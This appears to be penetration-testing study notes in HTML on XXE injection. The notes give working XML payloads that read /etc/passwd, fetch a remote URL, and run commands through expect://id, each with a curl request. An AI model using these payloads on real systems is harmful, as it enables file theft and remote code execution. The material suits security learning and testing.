<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XXE: XML data visible in HTTP response</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XXE: XML data visible in HTTP response</h1><br/><br />XXE vulnerability is relevant only for the applications parsing XML data, the main attack vector when testing an application for XXE vulnerability will be any feature within the application which takes input in XML format<br /><br /><strong>When the parsed XML data is visible in HTTP response</strong><br />If an application is parsing XML data and displaying the result of parsed XML in HTTP response, we can send an XXE payload and check the result<br />Below we have some examples to understand it.<br />   <span style="text-decoration:underline;">1) Proof of Concept(POC)</span><br />      1- Payload (book2.xml)<br />          <div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span>?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span> <span style="color:#333333;font-weight:400">[</span><br /><span style="color:#333333;font-weight:400">&lt;!ELEMENT</span> foo ANY <span style="color:#333333;font-weight:400">&gt;</span><br /><span style="color:#333333;font-weight:400">&lt;!ENTITY xxe</span> <span style="color:#3ad900;font-weight:400">&quot;It works!!!&quot;</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;entry&gt;<br />    &lt;author&gt;<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/author&gt;<br />    &lt;title&gt;The Hitchhiker&#39;s Guide to the Galaxy&lt;/title&gt;<br />    &lt;publish_date&gt;1979&lt;/publish_date&gt;<br />&lt;/entry&gt;<br /></pre></div><br />      2- Request<br />          <div class="codebox"><pre>curl -d@/home/student/Desktop/XXE/book1.xml http://example.org/book.php</pre></div><br />         -d [data] → Sends the specified data in a POST request to the HTTP server, in the same way that a browser does when a user has filled in an HTML form and presses the submit button. If we start the data with the letter <strong>@</strong>, the rest should be a file name to read the data from.<br />            <a href=""><img src="images/1565-1.png" alt="images/1565-1.png" /></a><br />   <span style="text-decoration:underline;">2) Display Local Files</span><br />      1- Payload (book3.xml)<br />        <div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span>?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span> <span style="color:#333333;font-weight:400">[</span><br /><span style="color:#333333;font-weight:400">&lt;!ELEMENT</span> foo ANY <span style="color:#333333;font-weight:400">&gt;</span><br /><span style="color:#333333;font-weight:400">&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#3ad900;font-weight:400">&quot;file:///etc/passwd&quot;</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;entry&gt;<br />    &lt;author&gt;<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/author&gt;<br />    &lt;title&gt;The Hitchhiker&#39;s Guide to the Galaxy&lt;/title&gt;<br />    &lt;publish_date&gt;1979&lt;/publish_date&gt;<br />&lt;/entry&gt;<br /></pre></div><br />      2- Request<br />        <div class="codebox"><pre>curl -d@/home/student/Desktop/XXE/book3.xml http://example.org/book.php</pre></div> <br />            <a href=""><img src="images/1565-2.png" alt="images/1565-2.png" /></a><br /><br />   3) Remote File Inclusion (RFI)<br />     1- Payload (book4.xml)<br />        <div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span>?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span> <span style="color:#333333;font-weight:400">[</span><br /><span style="color:#333333;font-weight:400">&lt;!ELEMENT</span> foo ANY <span style="color:#333333;font-weight:400">&gt;</span><br /><span style="color:#333333;font-weight:400">&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#3ad900;font-weight:400">&quot;http://example.org/robots.txt&quot;</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;entry&gt;<br />    &lt;author&gt;<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/author&gt;<br />    &lt;title&gt;The Hitchhiker&#39;s Guide to the Galaxy&lt;/title&gt;<br />    &lt;publish_date&gt;1979&lt;/publish_date&gt;<br />&lt;/entry&gt;</pre></div><br />      2- Request<br />        <div class="codebox"><pre>curl -d@/home/student/Desktop/XXE/book4.xml http://example.org/book.php</pre></div><br />            <a href=""><img src="images/1565-3.png" alt="images/1565-3.png" /></a><br />   4) Remote code Execution via PHP<span style="color:#ff0000;">(WARNING: NOT TESTED)</span><br />     We need to use expect://[command]<br />     1- Payload (book5.xml)<br />        <div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span>?&gt;<br /><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">foo</span> <span style="color:#333333;font-weight:400">[</span><br /><span style="color:#333333;font-weight:400">&lt;!ELEMENT</span> foo ANY <span style="color:#333333;font-weight:400">&gt;</span><br /><span style="color:#333333;font-weight:400">&lt;!ENTITY xxe</span> <span style="color:#333333;font-weight:400">SYSTEM</span> <span style="color:#3ad900;font-weight:400">&quot;expect://id&quot;</span> <span style="color:#333333;font-weight:400">&gt;]&gt;</span><br />&lt;entry&gt;<br />    &lt;subject&gt;<span style="color:#ffdd00;font-weight:400">&amp;xxe;</span>&lt;/subject&gt;<br />    &lt;category&gt;Random text 1&lt;/category&gt;<br />    &lt;text&gt;Random text 2&lt;/text&gt;<br />&lt;/entry&gt;</pre></div><br />      2- Request<br />        <div class="codebox"><pre>curl -d@/home/student/Desktop/XXE/book5.xml http://example.org/guide/xml.php</pre></div><br />            <br />    <br />      <br />Bibliography:<br />• <a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">https://www.synack.com/blog/a-deep-dive-into-xxe-injection/</a></div>
</body>
</html>
